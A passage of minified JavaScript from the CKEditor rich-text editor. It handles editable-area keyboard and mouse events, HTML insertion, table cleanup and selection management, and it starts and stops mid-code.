                                n.remove(), r.select(), c.fire("saveSnapshot"), t = 1) : r.collapsed && ((i = s.block) && (a = i[l ? "getPrevious" : "getNext"](h)) && a.type == CKEDITOR.NODE_ELEMENT && a.is("table") && r[l ? "checkStartOfBlock" : "checkEndOfBlock"]() ? (c.fire("saveSnapshot"),
                                r[l ? "checkEndOfBlock" : "checkStartOfBlock"]() && i.remove(), r["moveToElementEdit" + (l ? "End" : "Start")](a),
                                r.select(), c.fire("saveSnapshot"), t = 1) : s.blockLimit && s.blockLimit.is("td") && (o = s.blockLimit.getAscendant("table")) && r.checkBoundaryOfElement(o, l ? CKEDITOR.START : CKEDITOR.END) && (a = o[l ? "getPrevious" : "getNext"](h)) ? (c.fire("saveSnapshot"),
                                r["moveToElementEdit" + (l ? "End" : "Start")](a), r.checkStartOfBlock() && r.checkEndOfBlock() ? a.remove() : r.select(),
                                c.fire("saveSnapshot"), t = 1) : (o = s.contains([ "td", "th", "caption" ])) && r.checkBoundaryOfElement(o, l ? CKEDITOR.START : CKEDITOR.END) && (t = 1));
                            }
                            return !t;
                        }), c.blockless && CKEDITOR.env.ie && CKEDITOR.env.needsBrFiller && this.attachListener(this, "keyup", function(e) {
                            e.data.getKeystroke() in d && !this.getFirst(L) && (this.appendBogus(), (e = c.createRange()).moveToPosition(this, CKEDITOR.POSITION_AFTER_START),
                            e.select());
                        }), this.attachListener(this, "dblclick", function(e) {
                            if (c.readOnly) return !1;
                            e = {
                                element: e.data.getTarget()
                            }, c.fire("doubleclick", e);
                        }), CKEDITOR.env.ie && this.attachListener(this, "click", i), CKEDITOR.env.ie || this.attachListener(this, "mousedown", function(e) {
                            var t = e.data.getTarget();
                            t.is("img", "hr", "input", "textarea", "select") && !t.isReadOnly() && (c.getSelection().selectElement(t),
                            t.is("input", "textarea", "select") && e.data.preventDefault());
                        }), CKEDITOR.env.gecko && this.attachListener(this, "mouseup", function(e) {
                            if (2 == e.data.$.button && !(e = e.data.getTarget()).getOuterHtml().replace(o, "")) {
                                var t = c.createRange();
                                t.moveToElementEditStart(e), t.select(!0);
                            }
                        }), CKEDITOR.env.webkit && (this.attachListener(this, "click", function(e) {
                            e.data.getTarget().is("input", "select") && e.data.preventDefault();
                        }), this.attachListener(this, "mouseup", function(e) {
                            e.data.getTarget().is("input", "textarea") && e.data.preventDefault();
                        })), CKEDITOR.env.webkit && this.attachListener(c, "key", function(e) {
                            if ((e = e.data.domEvent.getKey()) in d) {
                                var t = 8 == e, n = c.getSelection().getRanges()[0];
                                if (e = n.startPath(), n.collapsed) {
                                    var i;
                                    e: {
                                        var o = e.block;
                                        if (o) if (n[t ? "checkStartOfBlock" : "checkEndOfBlock"]()) if (n.moveToClosestEditablePosition(o, !t) && n.collapsed) {
                                            if (n.startContainer.type == CKEDITOR.NODE_ELEMENT) {
                                                var a = n.startContainer.getChild(n.startOffset - (t ? 1 : 0));
                                                if (a && a.type == CKEDITOR.NODE_ELEMENT && a.is("hr")) {
                                                    c.fire("saveSnapshot"), a.remove(), i = !0;
                                                    break e;
                                                }
                                            }
                                            var r;
                                            !(n = n.startPath().block) || n && n.contains(o) || (c.fire("saveSnapshot"), (r = (t ? n : o).getBogus()) && r.remove(),
                                            r = (i = c.getSelection()).createBookmarks(), (t ? o : n).moveChildren(t ? n : o, !1),
                                            e.lastElement.mergeSiblings(), l(o, n, !t), i.selectBookmarks(r), i = !0);
                                        } else i = !1; else i = !1; else i = !1;
                                    }
                                    if (!i) return;
                                } else if (t = n, i = e.block, r = t.endPath().block, i && r && !i.equals(r) ? (c.fire("saveSnapshot"),
                                (o = i.getBogus()) && o.remove(), t.deleteContents(), r.getParent() && (r.moveChildren(i, !1),
                                e.lastElement.mergeSiblings(), l(i, r, !0)), (t = c.getSelection().getRanges()[0]).collapse(1),
                                t.select(), e = !0) : e = !1, !e) return;
                                return c.getSelection().scrollIntoView(), c.fire("saveSnapshot"), !1;
                            }
                        }, this, null, 100);
                    }
                }
            },
            _: {
                detach: function() {
                    var e;
                    if (this.editor.setData(this.editor.getData(), 0, 1), this.clearListeners(), this.restoreAttrs(),
                    e = this.removeCustomData("classes")) for (;e.length; ) this.removeClass(e.pop());
                    if (!this.is("textarea")) {
                        var t = (e = this.getDocument()).getHead();
                        if (t.getCustomData("stylesheet")) {
                            var n = e.getCustomData("stylesheet_ref");
                            --n ? e.setCustomData("stylesheet_ref", n) : (e.removeCustomData("stylesheet_ref"),
                            t.removeCustomData("stylesheet").remove());
                        }
                    }
                    this.editor.fire("contentDomUnload"), delete this.editor;
                }
            }
        }), CKEDITOR.editor.prototype.editable = function(e) {
            var t = this._.editable;
            return t && e ? 0 : (arguments.length && (t = this._.editable = e ? e instanceof CKEDITOR.editable ? e : new CKEDITOR.editable(this, e) : (t && t.detach(),
            null)), t);
        };
        var u = CKEDITOR.dom.walker.bogus(), o = /(^|<body\b[^>]*>)\s*<(p|div|address|h\d|center|pre)[^>]*>\s*(?:<br[^>]*>|&nbsp;|\u00A0|&#160;)?\s*(:?<\/\2>)?\s*(?=$|<\/body>)/gi, h = CKEDITOR.dom.walker.whitespaces(!0), t = CKEDITOR.dom.walker.bookmark(!1, !0);
        CKEDITOR.on("instanceLoaded", function(e) {
            var c = e.editor;
            c.on("insertElement", function(e) {
                (e = e.data).type == CKEDITOR.NODE_ELEMENT && (e.is("input") || e.is("textarea")) && ("false" != e.getAttribute("contentEditable") && e.data("cke-editable", e.hasAttribute("contenteditable") ? "true" : "1"),
                e.setAttribute("contentEditable", !1));
            }), c.on("selectionChange", function(e) {
                if (!c.readOnly) {
                    var t = c.getSelection();
                    t && !t.isLocked && (t = c.checkDirty(), c.fire("lockSnapshot"), o = (n = e).editor,
                    r = (a = n.data.path).blockLimit, l = (s = n.data.selection).getRanges()[0], (CKEDITOR.env.gecko || CKEDITOR.env.ie && CKEDITOR.env.needsBrFiller) && (s = function(e, t) {
                        if (s.isFake) return 0;
                        var n = t.block || t.blockLimit, i = n && n.getLast(L);
                        return !n || !n.isBlockBoundary() || i && i.type == CKEDITOR.NODE_ELEMENT && i.isBlockBoundary() || n.is("pre") || n.getBogus() ? void 0 : n;
                    }(0, a)) && (s.appendBogus(), i = CKEDITOR.env.ie), B(o, a.block, r) && l.collapsed && !l.getCommonAncestor().isReadOnly() && ((a = l.clone()).enlarge(CKEDITOR.ENLARGE_BLOCK_CONTENTS),
                    (r = new CKEDITOR.dom.walker(a)).guard = function(e) {
                        return !L(e) || e.type == CKEDITOR.NODE_COMMENT || e.isReadOnly();
                    }, (!r.checkForward() || a.checkStartOfBlock() && a.checkEndOfBlock()) && (o = l.fixBlock(!0, o.activeEnterMode == CKEDITOR.ENTER_DIV ? "div" : "p"),
                    CKEDITOR.env.needsBrFiller || (o = o.getFirst(L)) && o.type == CKEDITOR.NODE_TEXT && CKEDITOR.tools.trim(o.getText()).match(/^(?:&nbsp;|\xa0)$/) && o.remove(),
                    i = 1, n.cancel())), i && l.select(), c.fire("unlockSnapshot"), !t && c.resetDirty());
                }
                var n, i, o, a, r, s, l;
            });
        }), CKEDITOR.on("instanceCreated", function(e) {
            var o = e.editor;
            o.on("mode", function() {
                var e = o.editable();
                if (e && e.isInline()) {
                    var t = o.title;
                    if (e.changeAttr("role", "textbox"), e.changeAttr("aria-label", t), t && e.changeAttr("title", t),
                    (i = o.fire("ariaEditorHelpLabel", {}).label) && (t = this.ui.space(this.elementMode == CKEDITOR.ELEMENT_MODE_INLINE ? "top" : "contents"))) {
                        var n = CKEDITOR.tools.getNextId(), i = CKEDITOR.dom.element.createFromHtml('<span id="' + n + '" class="cke_voice_label">' + i + "</span>");
                        t.append(i), e.changeAttr("aria-describedby", n);
                    }
                }
            });
        }), CKEDITOR.addCss(".cke_editable{cursor:text}.cke_editable img,.cke_editable input,.cke_editable textarea{cursor:default}");
        var c = function() {
            function _(e) {
                return e.type == CKEDITOR.NODE_ELEMENT;
            }
            function k(e, t) {
                var n, i = [], o = e.getChildren(), a = o.count(), r = 0, s = S[t], l = !e.is(S.$inline) || e.is("br");
                for (l && i.push(" "); r < a; r++) _(n = o.getItem(r)) && !n.is(s) ? i = i.concat(k(n, t)) : i.push(n);
                return l && i.push(" "), i;
            }
            function N(e) {
                return e && _(e) && (e.is(S.$removeEmpty) || e.is("a") && !e.isBlockBoundary());
            }
            var S = CKEDITOR.dtd, w = {
                p: 1,
                div: 1,
                h1: 1,
                h2: 1,
                h3: 1,
                h4: 1,
                h5: 1,
                h6: 1,
                ul: 1,
                ol: 1,
                li: 1,
                pre: 1,
                dl: 1,
                blockquote: 1
            }, x = {
                p: 1,
                div: 1,
                h1: 1,
                h2: 1,
                h3: 1,
                h4: 1,
                h5: 1,
                h6: 1
            }, A = CKEDITOR.tools.extend({}, S.$inline);
            return delete A.br, function(e, t, n) {
                var i = (d = e.editor).getSelection().getRanges()[0], o = !1;
                if ("unfiltered_html" == t && (t = "html", o = !0), !i.checkReadOnly()) {
                    var a, r, s, l, c, d = (t = {
                        type: t,
                        dontFilter: o,
                        editable: e,
                        editor: d,
                        range: i,
                        blockLimit: u = new CKEDITOR.dom.elementPath(i.startContainer, i.root).blockLimit || i.root,
                        mergeCandidates: [],
                        zombies: []
                    }).range;
                    if (o = t.mergeCandidates, "text" == t.type && d.shrink(CKEDITOR.SHRINK_ELEMENT, !0, !1) && (a = CKEDITOR.dom.element.createFromHtml("<span>&nbsp;</span>", d.document),
                    d.insertNode(a), d.setStartAfter(a)), r = new CKEDITOR.dom.elementPath(d.startContainer),
                    t.endPath = s = new CKEDITOR.dom.elementPath(d.endContainer), !d.collapsed) {
                        var u = s.block || s.blockLimit, h = d.getCommonAncestor();
                        u && !u.equals(h) && !u.contains(h) && d.checkEndOfBlock() && t.zombies.push(u),
                        d.deleteContents();
                    }
                    for (;(l = _(d.startContainer) && d.startContainer.getChild(d.startOffset - 1)) && _(l) && l.isBlockBoundary() && r.contains(l); ) d.moveToPosition(l, CKEDITOR.POSITION_BEFORE_END);
                    for (function e(t, n, i, o) {
                        var a, r, s = t.clone();
                        s.setEndAt(n, CKEDITOR.POSITION_BEFORE_END), (a = new CKEDITOR.dom.walker(s).next()) && _(a) && w[a.getName()] && (r = a.getPrevious()) && _(r) && !r.getParent().equals(t.startContainer) && i.contains(r) && o.contains(a) && a.isIdentical(r) && (a.moveChildren(r),
                        a.remove(), e(t, n, i, o));
                    }(d, t.blockLimit, r, s), a && (d.setEndBefore(a), d.collapse(), a.remove()), (u = (a = d.startPath()).contains(N, !1, 1)) && (d.splitElement(u),
                    t.inlineStylesRoot = u, t.inlineStylesPeak = a.lastElement), (u = (a = d.createBookmark()).startNode.getPrevious(L)) && _(u) && N(u) && o.push(u),
                    (u = a.startNode.getNext(L)) && _(u) && N(u) && o.push(u), u = a.startNode; (u = u.getParent()) && N(u); ) o.push(u);
                    if (d.moveToBookmark(a), a = n) {
                        if (a = t.range, "text" == t.type && t.inlineStylesRoot) {
                            for (d = (l = t.inlineStylesPeak).getDocument().createText("{cke-peak}"), o = t.inlineStylesRoot.getParent(); !l.equals(o); ) d = d.appendTo(l.clone()),
                            l = l.getParent();
                            n = d.getOuterHtml().split("{cke-peak}").join(n);
                        }
                        if (l = t.blockLimit.getName(), /^\s+|\s+$/.test(n) && "span" in CKEDITOR.dtd[l] && (n = (O = '<span data-cke-marker="1">&nbsp;</span>') + n + O),
                        n = t.editor.dataProcessor.toHtml(n, {
                            context: null,
                            fixForBody: !1,
                            dontFilter: t.dontFilter,
                            filter: t.editor.activeFilter,
                            enterMode: t.editor.activeEnterMode
                        }), (l = a.document.createElement("body")).setHtml(n), O && (l.getFirst().remove(),
                        l.getLast().remove()), (O = a.startPath().block) && (1 != O.getChildCount() || !O.getBogus())) e: {
                            var f;
                            if (1 == l.getChildCount() && _(f = l.getFirst()) && f.is(x)) {
                                for (a = 0, o = (O = f.getElementsByTag("*")).count(); a < o; a++) if (!(d = O.getItem(a)).is(A)) break e;
                                f.moveChildren(f.getParent(1)), f.remove();
                            }
                        }
                        t.dataWrapper = l, a = n;
                    }
                    if (a) {
                        var m, g, E, p, T, C, I, O = (f = t.range).document;
                        for (n = t.blockLimit, l = [], o = d = a = 0, r = f.startContainer, s = (u = t.endPath.elements[0]).getPosition(r),
                        h = !(!u.getCommonAncestor(r) || s == CKEDITOR.POSITION_IDENTICAL || s & CKEDITOR.POSITION_CONTAINS + CKEDITOR.POSITION_IS_CONTAINED),
                        function(e, t) {
                            function n(e, t) {
                                if (t.isBlock && t.isElement && !t.node.is("br") && _(e) && e.is("br")) return e.remove(),
                                1;
                            }
                            var i = t.endContainer.getChild(t.endOffset), o = t.endContainer.getChild(t.endOffset - 1);
                            i && n(i, e[e.length - 1]), o && n(o, e[0]) && (t.setEnd(t.endContainer, t.endOffset - 1),
                            t.collapse());
                        }(r = function e(t, n) {
                            var i, o, a, r, s = [], l = n.range.startContainer;
                            i = n.range.startPath(), l = S[l.getName()];
                            for (var c = 0, d = t.getChildren(), u = d.count(), h = -1, f = -1, m = 0, g = i.contains(S.$list); c < u; ++c) _(i = d.getItem(c)) ? (a = i.getName(),
                            g && a in CKEDITOR.dtd.$list ? s = s.concat(e(i, n)) : (r = !!l[a], "br" != a || !i.data("cke-eol") || c && c != u - 1 || (m = (o = c ? s[c - 1].node : d.getItem(c + 1)) && (!_(o) || !o.is("br")),
                            o = o && _(o) && S.$block[o.getName()]), -1 == h && !r && (h = c), r || (f = c),
                            s.push({
                                isElement: 1,
                                isLineBreak: m,
                                isBlock: i.isBlockBoundary(),
                                hasBlockSibling: o,
                                node: i,
                                name: a,
                                allowed: r
                            }), o = m = 0)) : s.push({
                                isElement: 0,
                                node: i,
                                allowed: 1
                            });
                            return -1 < h && (s[h].firstNotAllowed = 1), -1 < f && (s[f].lastNotAllowed = 1),
                            s;
                        }(t.dataWrapper, t), f); a < r.length; a++) {
                            if (m = (s = r[a]).isLineBreak) {
                                m = f, T = n;
                                var D = void 0, R = void 0;
                                s.hasBlockSibling ? m = 1 : (D = m.startContainer.getAscendant(S.$block, 1)) && D.is({
                                    div: 1,
                                    p: 1
                                }) ? (R = D.getPosition(T)) == CKEDITOR.POSITION_IDENTICAL || R == CKEDITOR.POSITION_CONTAINS ? m = 0 : (T = m.splitElement(D),
                                m.moveToPosition(T, CKEDITOR.POSITION_AFTER_START), m = 1) : m = 0;
                            }
                            if (m) o = 0 < a; else {
                                if (m = f.startPath(), !s.isBlock && B(t.editor, m.block, m.blockLimit) && (p = t.editor.activeEnterMode != CKEDITOR.ENTER_BR && !1 !== t.editor.config.autoParagraph && (t.editor.activeEnterMode == CKEDITOR.ENTER_DIV ? "div" : "p")) && ((p = O.createElement(p)).appendBogus(),
                                f.insertNode(p), CKEDITOR.env.needsBrFiller && (g = p.getBogus()) && g.remove(),
                                f.moveToPosition(p, CKEDITOR.POSITION_BEFORE_END)), (m = f.startPath().block) && !m.equals(E) && ((g = m.getBogus()) && (g.remove(),
                                l.push(m)), E = m), s.firstNotAllowed && (d = 1), d && s.isElement) {
                                    for (m = f.startContainer, T = null; m && !S[m.getName()][s.name]; ) {
                                        if (m.equals(n)) {
                                            m = null;
                                            break;
                                        }
                                        m = (T = m).getParent();
                                    }
                                    if (m) T && (C = f.splitElement(T), t.zombies.push(C), t.zombies.push(T)); else {
                                        T = n.getName(), I = !a, m = a == r.length - 1, D = [], R = (T = k(s.node, T)).length;
                                        for (var v = 0, b = void 0, K = 0, y = -1; v < R; v++) " " == (b = T[v]) ? (K || I && !v || (D.push(new CKEDITOR.dom.text(" ")),
                                        y = D.length), K = 1) : (D.push(b), K = 0);
                                        m && y == D.length && D.pop(), I = D;
                                    }
                                }
                                if (I) {
                                    for (;m = I.pop(); ) f.insertNode(m);
                                    I = 0;
                                } else f.insertNode(s.node);
                                s.lastNotAllowed && a < r.length - 1 && ((C = h ? u : C) && f.setEndAt(C, CKEDITOR.POSITION_AFTER_START),
                                d = 0), f.collapse();
                            }
                        }
                        t.dontMoveCaret = o, t.bogusNeededBlocks = l;
                    }
                    for (g = t.range, C = t.bogusNeededBlocks, I = g.createBookmark(); E = t.zombies.pop(); ) E.getParent() && ((p = g.clone()).moveToElementEditStart(E),
                    p.removeEmptyBlocksAtEnd());
                    if (C) for (;E = C.pop(); ) CKEDITOR.env.needsBrFiller ? E.appendBogus() : E.append(g.document.createText(" "));
                    for (;E = t.mergeCandidates.pop(); ) E.mergeSiblings();
                    if (g.moveToBookmark(I), !t.dontMoveCaret) {
                        for (E = _(g.startContainer) && g.startContainer.getChild(g.startOffset - 1); E && _(E) && !E.is(S.$empty); ) {
                            if (E.isBlockBoundary()) g.moveToPosition(E, CKEDITOR.POSITION_BEFORE_END); else {
                                if (N(E) && E.getHtml().match(/(\s|&nbsp;)$/g)) {
                                    c = null;
                                    break;
                                }
                                (c = g.clone()).moveToPosition(E, CKEDITOR.POSITION_BEFORE_END);
                            }
                            E = E.getLast(L);
                        }
                        c && g.moveToRange(c);
                    }
                    i.select(), P(e);
                }
            };
        }(), d = function() {
            function o(e) {
                return (e = new CKEDITOR.dom.walker(e)).guard = function(e, t) {
                    return !t && (e.type == CKEDITOR.NODE_ELEMENT ? e.is(CKEDITOR.dtd.$tableContent) : void 0);
                }, e.evaluator = function(e) {
                    return e.type == CKEDITOR.NODE_ELEMENT;
                }, e;
            }
            function a(e, t, n) {
                return t = e.getDocument().createElement(t), e.append(t, n), t;
            }
            function r(e) {
                for (var t, n = e.count(); 0 < n--; ) t = e.getItem(n), CKEDITOR.tools.trim(t.getHtml()) || (t.appendBogus(),
                CKEDITOR.env.ie && CKEDITOR.env.version < 9 && t.getChildCount() && t.getFirst().remove());
            }
            return function(e) {
                var t = e.startContainer, n = t.getAscendant("table", 1), i = !1;
                r(n.getElementsByTag("td")), r(n.getElementsByTag("th")), (n = e.clone()).setStart(t, 0),
                (n = o(n).lastBackward()) || ((n = e.clone()).setEndAt(t, CKEDITOR.POSITION_BEFORE_END),
                n = o(n).lastForward(), i = !0), n || (n = t), n.is("table") ? (e.setStartAt(n, CKEDITOR.POSITION_BEFORE_START),
                e.collapse(!0), n.remove()) : (n.is({
                    tbody: 1,
                    thead: 1,
                    tfoot: 1
                }) && (n = a(n, "tr", i)), n.is("tr") && (n = a(n, n.getParent().is("thead") ? "th" : "td", i)),
                (t = n.getBogus()) && t.remove(), e.moveToPosition(n, i ? CKEDITOR.POSITION_AFTER_START : CKEDITOR.POSITION_BEFORE_END));
            };
        }();
    }(), function() {
        function g() {
            var e, t = this._.fakeSelection;
            t && ((e = this.getSelection(1)) && e.isHidden() || (t.reset(), t = 0)), (t || (t = e || this.getSelection(1)) && t.getType() != CKEDITOR.SELECTION_NONE) && (this.fire("selectionCheck", t),
            (e = this.elementPath()).compare(this._.selectionPreviousPath) || (CKEDITOR.env.webkit && (this._.previousActive = this.document.getActive()),
            this._.selectionPreviousPath = e, this.fire("selectionChange", {
                selection: t,
                path: e
            })));
        }
        function E() {
            n = !0, t || (e.call(this), t = CKEDITOR.tools.setTimeout(e, 200, this));
        }
        function e() {
            t = null, n && (CKEDITOR.tools.setTimeout(g, 0, this), n = !1);
        }
        function a(e) {
            return !(!i(e) && (e.type != CKEDITOR.NODE_ELEMENT || e.is(CKEDITOR.dtd.$empty)));
        }
        function u(n) {
            function e(e, t) {
                return !(!e || e.type == CKEDITOR.NODE_TEXT) && n.clone()["moveToElementEdit" + (t ? "End" : "Start")](e);
            }
            if (!(n.root instanceof CKEDITOR.editable)) return !1;
            var t = n.startContainer, i = n.getPreviousNode(a, null, t), o = n.getNextNode(a, null, t);
            return !(!e(i) && !e(o, 1) && (i || o || t.type == CKEDITOR.NODE_ELEMENT && t.isBlockBoundary() && t.getBogus()));
        }
        function r(e) {
            return e.getCustomData("cke-fillingChar");
        }
        function p(e, t) {
            var n = e && e.removeCustomData("cke-fillingChar");
            if (n) {
                if (!1 !== t) {
                    var i, o = e.getDocument().getSelection().getNative(), a = o && "None" != o.type && o.getRangeAt(0);
                    1 < n.getLength() && a && a.intersectsNode(n.$) && (i = l(o), a = o.focusNode == n.$ && 0 < o.focusOffset,
                    o.anchorNode == n.$ && 0 < o.anchorOffset && i[0].offset--, a && i[1].offset--);
                }
                n.setText(s(n.getText())), i && c(e.getDocument().$, i);
            }
        }
        function s(e) {
            return e.replace(/\u200B( )?/g, function(e) {
                return e[1] ? " " : "";
            });
        }
        function l(e) {
            return [ {
                node: e.anchorNode,
                offset: e.anchorOffset
            }, {
                node: e.focusNode,
                offset: e.focusOffset
            } ];
        }
        function c(e, t) {
            var n = e.getSelection(), i = e.createRange();
            i.setStart(t[0].node, t[0].offset), i.collapse(!0), n.removeAllRanges(), n.addRange(i),
            n.extend(t[1].node, t[1].offset);
        }
        var t, n, i = CKEDITOR.dom.walker.invisible(1), o = function() {
            function e(n) {
                return function(e) {
                    var t = e.editor.createRange();
                    return t.moveToClosestEditablePosition(e.selected, n) && e.editor.getSelection().selectRanges([ t ]),
                    !1;
                };
            }
            function t(o) {
                return function(e) {
                    var t, n = e.editor, i = n.createRange();
                    return (t = i.moveToClosestEditablePosition(e.selected, o)) || (t = i.moveToClosestEditablePosition(e.selected, !o)),
                    t && n.getSelection().selectRanges([ i ]), n.fire("saveSnapshot"), e.selected.remove(),
                    t || (i.moveToElementEditablePosition(n.editable()), n.getSelection().selectRanges([ i ])),
                    n.fire("saveSnapshot"), !1;
                };
            }
            var n = e(), i = e(1);
            return {
                37: n,
                38: n,
                39: i,
                40: i,
                8: t(),
                46: t(1)
            };
        }();
        CKEDITOR.on("instanceCreated", function(e) {
            function t() {
                var e = m.getSelection();
                e && e.removeAllRanges();
            }
            var m = e.editor;
            m.on("contentDom", function() {
                function e() {
                    (i = new CKEDITOR.dom.selection(m.getSelection())).lock();
                }
                function n() {
                    c.removeListener("mouseup", n), h.removeListener("mouseup", n);
                    var e = CKEDITOR.document.$.selection, t = e.createRange();
                    "None" != e.type && t.parentElement().ownerDocument == l.$ && t.select();
                }
                var t, i, o, a, r, s, l = m.document, c = CKEDITOR.document, d = m.editable(), u = l.getBody(), h = l.getDocumentElement(), f = d.isInline();
                CKEDITOR.env.gecko && d.attachListener(d, "focus", function(e) {
                    e.removeListener(), 0 !== t && (e = m.getSelection().getNative()) && e.isCollapsed && e.anchorNode == d.$ && ((e = m.createRange()).moveToElementEditStart(d),
                    e.select());
                }, null, null, -2), d.attachListener(d, CKEDITOR.env.webkit ? "DOMFocusIn" : "focus", function() {
                    t && CKEDITOR.env.webkit && (t = m._.previousActive && m._.previousActive.equals(l.getActive())),
                    m.unlockSelection(t), t = 0;
                }, null, null, -1), d.attachListener(d, "mousedown", function() {
                    t = 0;
                }), (CKEDITOR.env.ie || f) && (T ? d.attachListener(d, "beforedeactivate", e, null, null, -1) : d.attachListener(m, "selectionCheck", e, null, null, -1),
                d.attachListener(d, CKEDITOR.env.webkit ? "DOMFocusOut" : "blur", function() {
                    m.lockSelection(i), t = 1;
                }, null, null, -1), d.attachListener(d, "mousedown", function() {
                    t = 0;
                })), CKEDITOR.env.ie && !f && (d.attachListener(d, "mousedown", function(e) {
                    2 == e.data.$.button && ((e = m.document.getSelection()) && e.getType() != CKEDITOR.SELECTION_NONE || (o = m.window.getScrollPosition()));
                }), d.attachListener(d, "mouseup", function(e) {
                    2 == e.data.$.button && o && (m.document.$.documentElement.scrollLeft = o.x, m.document.$.documentElement.scrollTop = o.y),
                    o = null;
                }), "BackCompat" != l.$.compatMode && ((CKEDITOR.env.ie7Compat || CKEDITOR.env.ie6Compat) && h.on("mousedown", function(e) {
                    function t(e) {
                        if (e = e.data.$, i) {
                            var t = u.$.createTextRange();
                            try {
                                t.moveToPoint(e.clientX, e.clientY);
                            } catch (e) {}
                            i.setEndPoint(o.compareEndPoints("StartToStart", t) < 0 ? "EndToEnd" : "StartToStart", t),
                            i.select();
                        }
                    }
                    function n() {
                        h.removeListener("mousemove", t), c.removeListener("mouseup", n), h.removeListener("mouseup", n),
                        i.select();
                    }
                    if ((e = e.data).getTarget().is("html") && e.$.y < h.$.clientHeight && e.$.x < h.$.clientWidth) {
                        var i = u.$.createTextRange();
                        try {
                            i.moveToPoint(e.$.clientX, e.$.clientY);
                        } catch (e) {}
                        var o = i.duplicate();
                        h.on("mousemove", t), c.on("mouseup", n), h.on("mouseup", n);
                    }
                }), 7 < CKEDITOR.env.version && CKEDITOR.env.version < 11 && h.on("mousedown", function(e) {
                    e.data.getTarget().is("html") && (c.on("mouseup", n), h.on("mouseup", n));
                }))), d.attachListener(d, "selectionchange", g, m), d.attachListener(d, "keyup", E, m),
                d.attachListener(d, CKEDITOR.env.webkit ? "DOMFocusIn" : "focus", function() {
                    m.forceNextSelectionCheck(), m.selectionChange(1);
                }), f && (CKEDITOR.env.webkit || CKEDITOR.env.gecko) ? (d.attachListener(d, "mousedown", function() {
                    a = 1;
                }), d.attachListener(l.getDocumentElement(), "mouseup", function() {
                    a && E.call(m), a = 0;
                })) : d.attachListener(CKEDITOR.env.ie ? d : l.getDocumentElement(), "mouseup", E, m),
                CKEDITOR.env.webkit && d.attachListener(l, "keydown", function(e) {
                    switch (e.data.getKey()) {
                      case 13:
                      case 33:
                      case 34:
                      case 35:
                      case 36:
                      case 37:
                      case 39:
                      case 8:
                      case 45:
                      case 46:
                        p(d);
                    }
                }, null, null, -1), d.attachListener(d, "keydown", (r = m, s = {
                    37: 1,
                    39: 1,
                    8: 1,
                    46: 1
                }, function(e) {
                    var t = e.data.getKeystroke();
                    if (s[t]) {
                        var n = r.getSelection().getRanges(), i = n[0];
                        1 == n.length && i.collapsed && (t = i[t < 38 ? "getPreviousEditableNode" : "getNextEditableNode"]()) && t.type == CKEDITOR.NODE_ELEMENT && "false" == t.getAttribute("contenteditable") && (r.getSelection().fake(t),
                        e.data.preventDefault(), e.cancel());
                    }
                }), null, null, -1);
            }), m.on("setData", function() {
                m.unlockSelection(), CKEDITOR.env.webkit && t();
            }), m.on("contentDomUnload", function() {
                m.unlockSelection();
            }), CKEDITOR.env.ie9Compat && m.on("beforeDestroy", t, null, null, 9), m.on("dataReady", function() {
                delete m._.fakeSelection, delete m._.hiddenSelectionContainer, m.selectionChange(1);
            }), m.on("loadSnapshot", function() {
                var e = CKEDITOR.dom.walker.nodeType(CKEDITOR.NODE_ELEMENT), t = m.editable().getLast(e);
                t && t.hasAttribute("data-cke-hidden-sel") && (t.remove(), CKEDITOR.env.gecko && (e = m.editable().getFirst(e)) && e.is("br") && e.getAttribute("_moz_editor_bogus_node") && e.remove());
            }, null, null, 100), m.on("key", function(e) {
                if ("wysiwyg" == m.mode) {
                    var t = m.getSelection();
                    if (t.isFake) {
                        var n = o[e.data.keyCode];
                        if (n) return n({
                            editor: m,
                            selected: t.getSelectedElement(),
                            selection: t,
                            keyEvent: e
                        });
                    }
                }
            });
        }), CKEDITOR.on("instanceReady", function(e) {
            function t() {
                var e = a.editable();
                if (e && (e = r(e))) {
                    var t = a.document.$.getSelection();
                    "None" == t.type || t.anchorNode != e.$ && t.focusNode != e.$ || (o = l(t)), i = e.getText(),
                    e.setText(s(i));
                }
            }
            function n() {
                var e = a.editable();
                e && (e = r(e)) && (e.setText(i), o && (c(a.document.$, o), o = null));
            }
            var i, o, a = e.editor;
            CKEDITOR.env.webkit && (a.on("selectionChange", function() {
                var e = a.editable(), t = r(e);
                t && (t.getCustomData("ready") ? p(e) : t.setCustomData("ready", 1));
            }, null, null, -1), a.on("beforeSetMode", function() {
                p(a.editable());
            }, null, null, -1), a.on("beforeUndoImage", t), a.on("afterUndoImage", n), a.on("beforeGetData", t, null, null, 0),
            a.on("getData", n));
        }), CKEDITOR.editor.prototype.selectionChange = function(e) {
            (e ? g : E).call(this);
        }, CKEDITOR.editor.prototype.getSelection = function(e) {
            return !this._.savedSelection && !this._.fakeSelection || e ? (e = this.editable()) && "wysiwyg" == this.mode ? new CKEDITOR.dom.selection(e) : null : this._.savedSelection || this._.fakeSelection;
        }, CKEDITOR.editor.prototype.lockSelection = function(e) {
            return (e = e || this.getSelection(1)).getType() != CKEDITOR.SELECTION_NONE && (!e.isLocked && e.lock(),
            this._.savedSelection = e, !0);
        }, CKEDITOR.editor.prototype.unlockSelection = function(e) {
            var t = this._.savedSelection;
            return !!t && (t.unlock(e), delete this._.savedSelection, !0);
        }, CKEDITOR.editor.prototype.forceNextSelectionCheck = function() {
            delete this._.selectionPreviousPath;
        }, CKEDITOR.dom.document.prototype.getSelection = function() {
            return new CKEDITOR.dom.selection(this);
        }, CKEDITOR.dom.range.prototype.select = function() {
            var e = this.root instanceof CKEDITOR.editable ? this.root.editor.getSelection() : new CKEDITOR.dom.selection(this.root);
            return e.selectRanges([ this ]), e;
        }, CKEDITOR.SELECTION_NONE = 1, CKEDITOR.SELECTION_TEXT = 2, CKEDITOR.SELECTION_ELEMENT = 3;
        var T = "function" != typeof window.getSelection, d = 1;
        CKEDITOR.dom.selection = function(e) {
            if (e instanceof CKEDITOR.dom.selection) {
                var t = e;
                e = e.root;
            }
            var n, i, o = e instanceof CKEDITOR.dom.element;
            if (this.rev = t ? t.rev : d++, this.document = e instanceof CKEDITOR.dom.document ? e : e.getDocument(),
            this.root = o ? e : this.document.getBody(), this.isLocked = 0, this._ = {
                cache: {}
            }, t) return CKEDITOR.tools.extend(this._.cache, t._.cache), this.isFake = t.isFake,
            this.isLocked = t.isLocked, this;
            if (e = this.getNative()) if (e.getRangeAt) n = (i = e.rangeCount && e.getRangeAt(0)) && new CKEDITOR.dom.node(i.commonAncestorContainer); else {
                try {
                    i = e.createRange();
                } catch (e) {}
                n = i && CKEDITOR.dom.element.get(i.item && i.item(0) || i.parentElement());
            }
